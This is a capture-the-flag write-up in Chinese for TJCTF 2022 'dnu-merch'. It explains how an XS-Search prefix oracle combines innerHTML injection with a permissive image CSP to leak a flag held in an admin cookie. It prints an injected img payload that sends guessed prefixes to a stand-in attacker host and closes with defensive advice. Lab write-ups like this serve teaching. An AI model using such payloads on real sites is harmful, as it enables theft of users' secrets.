# TJCTF2022 dnu-merch

## 题目简述

管理员浏览器的 `items` Cookie 中只有一个商品，其 `title` 就是 flag。搜索页读取该 Cookie，以 `title.startsWith(keyword)` 过滤商品；仅在有结果时，页面才用 `innerHTML` 显示原始搜索串。结合允许加载任意 HTTP/HTTPS 图片的 CSP，可以把“某个前缀是否命中”转换成向攻击者服务器发出的请求，形成 XS-Search 前缀 oracle。

## 解题过程

搜索参数可以包含逗号分隔的多个关键词。对候选前缀 `tjctf{...X`，构造：

```html
tjctf{...X, <img src="https://attacker/set?query=tjctf{...X" />
```

若第一个关键词确实是 flag 前缀，`filteredSearch.length` 非零，页面会执行：

```javascript
searchElement.innerHTML = `Results for: "${search}"`
```

注入的图片随即访问攻击者的 `/set`；若前缀错误，页面只写固定文本 `Results not found.`，不会创建图片。攻击页在 iframe 中依次尝试字符集 `A-Za-z0-9_{} `，每次等待约 400 ms 后查询攻击者服务器记录的最新前缀，命中就进入下一位。

管理员机器人预先设置 `SameSite=None; Secure` 的 Cookie，再访问提交的攻击页，因此 iframe 请求会携带含 flag 的 `items`。逐字节恢复后得到 `tjctf{wtf_not_h0nors_14452dbc}`。

## 方法总结

敏感值即使没有直接回显，只要能影响资源是否加载、响应大小、时间或缓存，就可能形成跨站搜索 oracle。本题还叠加了 `innerHTML` 注入与宽松 `img-src`。防护应避免把秘密放在可被客户端脚本枚举的数据中，对不可信文本使用 `textContent`，并收紧 CSP 与 Cookie 的跨站发送范围。
